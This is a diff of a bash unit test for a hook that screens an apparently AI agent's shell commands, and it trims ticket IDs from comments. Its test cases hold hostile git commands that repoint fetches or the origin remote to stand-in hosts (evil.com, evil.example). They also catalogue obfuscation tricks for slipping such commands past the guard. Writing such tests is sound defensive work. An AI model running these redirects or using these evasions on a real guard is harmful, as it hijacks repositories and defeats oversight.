@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Unit test for scripts/hooks/block-terminal-write-fence.sh (HIMMEL-745) — the
+# Unit test for scripts/hooks/block-terminal-write-fence.sh — the
 # codex-lane terminal write-fence. Exit 0 = allow, exit 2 = block.
 #
 # Hermetic: a temp HOME + isolated git config, temp git fixtures built with
@@ -15,7 +15,7 @@ GUARD="$HOOKS/block-terminal-write-fence.sh"
 command -v git >/dev/null 2>&1 || { echo "SKIP: git not on PATH"; exit 0; }
 command -v jq  >/dev/null 2>&1 || { echo "SKIP: jq not on PATH"; exit 0; }
 
-# NOT a bare `mktemp -d`: class (b) is DESTINATION-based since HIMMEL-2526
+# NOT a bare `mktemp -d`: class (b) is DESTINATION-based
 # (block-write-into-main-checkout.sh, sourced below), so a /tmp-rooted fixture
 # tree would have every destination row's resolved target silently exempted
 # by is_temp_or_devnull's `*/tmp/*` pattern — making the redirect-deny rows
@@ -85,7 +85,7 @@ check "config insteadof case variant" block '{"tool_name":"Bash","tool_input":{"
 check "git -c insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git -c url.https://evil.com/.insteadOf=https://github.com/ fetch","cwd":"'"$SWR"'"}}'
 check "git --config-env insteadOf one-shot fetch" block '{"tool_name":"Bash","tool_input":{"command":"git --config-env=url.https://evil.com/.insteadOf=R fetch","cwd":"'"$SWR"'"}}'
 check "git config set insteadOf rewrite" block '{"tool_name":"Bash","tool_input":{"command":"git config set url.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
-# HIMMEL-844 round 3: a dequoted key is the same key — quoting/escaping must not slip past.
+# a dequoted key is the same key — quoting/escaping must not slip past.
 check "git config single-quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config '"'"'url.https://evil.com/.insteadOf'"'"' https://github.com/","cwd":"'"$SWR"'"}}'
 check "git config double-quoted insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config \"url.https://evil.com/.insteadOf\" https://github.com/","cwd":"'"$SWR"'"}}'
 check "git config backslash-split insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config ur\\l.https://evil.com/.insteadOf https://github.com/","cwd":"'"$SWR"'"}}'
@@ -119,7 +119,7 @@ check "round 10 codex-1 NUL via \\c@ ends the segment" block '{"tool_name":"Bash
 check "round 10 codex-2 decoy + two adjacent split segments" block '{"tool_name":"Bash","tool_input":{"command":"echo '"'"'$'"'"' ; g$'"'"'\\x69'"'"'$'"'"'\\x74'"'"' config url.x.insteadOf y","cwd":"'"$SWR"'"}}'
 check "round 10 plain backslash-t inside the key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.ins\\teadOf y","cwd":"'"$SWR"'"}}'
 check "round 10 plain backslash-r inside url" block '{"tool_name":"Bash","tool_input":{"command":"git config remote.origin.u\\rl https://evil","cwd":"'"$SWR"'"}}'
-# HIMMEL-4032: a plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB), and
+# a plain escape OUTSIDE a dollar-quote is a bare char to bash (not a TAB), and
 # bash deletes a backslash-newline before parsing, so neither may split the key or the verb.
 check "HIMMEL-4032 dollar-quote + plain escape key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
 check "HIMMEL-4032 backslash-newline split insteadOf key" block '{"tool_name":"Bash","tool_input":{"command":"git config url.x.inste\\\nadOf Y","cwd":"'"$SWR"'"}}'
@@ -131,12 +131,12 @@ check "HIMMEL-4032 unjoined gh after a continuation stays denied" block '{"tool_
 check "HIMMEL-4032 dollar-quote + plain key, user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.$'"'"'\\x6e'"'"'ame x","cwd":"'"$SWR"'"}}'
 check "HIMMEL-4032 continuation inside user.name allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git config user.na\\\nme x","cwd":"'"$SWR"'"}}'
 check "HIMMEL-4032 harmless echo continuation allowed" allow '{"tool_name":"Bash","tool_input":{"command":"echo a \\\nb","cwd":"'"$SWR"'"}}'
-# HIMMEL-4225: a stray apostrophe in a # comment or a heredoc body opens no quote in bash, so it
+# a stray apostrophe in a # comment or a heredoc body opens no quote in bash, so it
 # must not desync the quote-aware stream and hide evasion 1 on the next line.
 check "HIMMEL-4225 apostrophe in a comment, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"# don'"'"'t panic\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
 check "HIMMEL-4225 apostrophe in a heredoc body, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<EOF\ndon'"'"'t panic\nEOF\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
 check "HIMMEL-4225 apostrophe in a comment, no insteadOf, allowed" allow '{"tool_name":"Bash","tool_input":{"command":"# don'"'"'t panic\necho hi","cwd":"'"$SWR"'"}}'
-# HIMMEL-4225 CR round 1: empty and unusual heredoc delimiters (bash ends `<<''` at an empty
+# empty and unusual heredoc delimiters (bash ends `<<''` at an empty
 # line) and an arithmetic `<<` must not desync the decoder either.
 check "HIMMEL-4225 empty single-quoted heredoc delimiter <<'', then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<'"'"''"'"'\ndon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
 check "HIMMEL-4225 empty double-quoted heredoc delimiter <<\"\", then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"cat <<\"\"\ndon'"'"'t panic\n\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
@@ -149,7 +149,7 @@ check "HIMMEL-4225 escaped quote inside a double-quoted heredoc delimiter, then 
 # shellcheck disable=SC2016  # literal $ is the payload
 check "HIMMEL-4225 arithmetic << is not a heredoc, then evasion 1" block '{"tool_name":"Bash","tool_input":{"command":"echo $((1<<2))\n# don'"'"'t\ngit config url.x.$'"'"'\\x69'"'"'ns\\teadOf Y","cwd":"'"$SWR"'"}}'
 check "HIMMEL-4225 empty heredoc delimiter, no insteadOf, allowed" allow '{"tool_name":"Bash","tool_input":{"command":"cat <<'"'"''"'"'\nit'"'"'s fine\n\necho ok","cwd":"'"$SWR"'"}}'
-# round 11: a 50 KB pad must not make grep hit E2BIG and skip the set-url deny (fail-open vs main)
+# a 50 KB pad must not make grep hit E2BIG and skip the set-url deny (fail-open vs main)
 PAD=$(head -c 50000 /dev/zero | tr "\0" a)
 check "round 11 padded set-url still denied (E2BIG)" block '{"tool_name":"Bash","tool_input":{"command":"git remote set-url origin https://evil.example/x.git ; echo '"$PAD"'","cwd":"'"$SWR"'"}}'
 check "round 7 git commit -m ANSI-C allowed" allow '{"tool_name":"Bash","tool_input":{"command":"git commit -m $'"'"'l1\\nl2'"'"'","cwd":"'"$SWR"'"}}'
